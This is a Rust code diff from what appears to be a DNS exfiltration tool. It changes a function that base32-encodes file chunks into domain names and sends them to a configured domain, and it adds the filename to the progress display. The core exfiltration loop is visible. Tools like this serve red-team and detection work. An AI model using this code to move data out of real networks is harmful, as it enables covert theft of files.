@@ -73,14 +73,20 @@ impl Client {
         Ok(())
     }
 
-    async fn send_data(&self, client: &mut AsyncClient, data: &[u8], session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
+    async fn send_data(
+        &self,
+        client: &mut AsyncClient,
+        data: &[u8],
+        filename: &str,
+        session_id: &str,
+        total_chunks: usize,
+    ) -> Result<(), DnsexError> {
         for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
             let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), seq, session_id, ChunkFlag::Data as u32);
 
             if self.config.progress {
                 let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
-                print!("\r[{}/{} ({:.2}%)] {}", seq + 1, total_chunks, progress, data_fqdn);
-
+                print!("\r[{:.2}% {}/{} {}] {}", progress, seq + 1, total_chunks, filename, data_fqdn);
                 let _ = std::io::stdout().flush();
             }
 
@@ -136,7 +142,7 @@ impl Client {
 
         println!("Exfiltrating {} to {}", payload.filename.to_string_lossy(), self.config.domain);
         self.send_init(&mut client, &filename, &session_id, total_chunks).await?;
-        self.send_data(&mut client, &payload.data, &session_id, total_chunks).await?;
+        self.send_data(&mut client, &payload.data, &filename, &session_id, total_chunks).await?;
 
         let mut retries = 0;
         const MAX_RETRIES: usize = 5;
